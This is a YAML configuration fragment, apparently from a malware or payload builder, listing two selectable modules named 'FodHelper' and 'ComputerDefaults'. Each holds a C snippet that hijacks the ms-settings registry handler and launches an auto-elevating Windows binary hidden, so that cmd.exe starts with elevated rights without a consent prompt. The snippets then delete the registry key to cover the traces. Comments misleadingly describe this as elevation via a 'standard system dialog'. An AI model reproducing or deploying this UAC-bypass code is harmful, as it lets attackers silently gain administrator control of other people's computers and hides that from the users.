      // No elevation handling
  - id: FodHelper
    display: Elevation Prompt
    default: false
    requires: []
    snippet: |
      // Elevation handling via standard system dialog
      {
          HKEY hKey;
          if (RegCreateKeyExA(HKEY_CURRENT_USER,
              "Software\\Classes\\ms-settings\\shell\\open\\command",
              0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
              const char* cmd = "C:\\Windows\\System32\\cmd.exe";
              RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)cmd, (DWORD)(strlen(cmd) + 1));
              RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
              RegCloseKey(hKey);

              SHELLEXECUTEINFOA sei = {sizeof(sei)};
              sei.lpVerb = "open";
              sei.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
              sei.nShow = SW_HIDE;
              ShellExecuteExA(&sei);
              Sleep(3000);

              RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
          }
      }
  - id: ComputerDefaults
    display: Elevation via System Dialog
    default: false
    requires: []
    snippet: |
      // Elevation handling via system dialog
      {
          HKEY hKey;
          if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command",
                              0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
              const wchar_t* cmd = L"cmd.exe";
              RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)cmd, (DWORD)((wcslen(cmd) + 1) * sizeof(wchar_t)));
              RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", sizeof(wchar_t));
              RegCloseKey(hKey);

              ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, SW_HIDE);
              Sleep(3000);

              RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
          }
      }
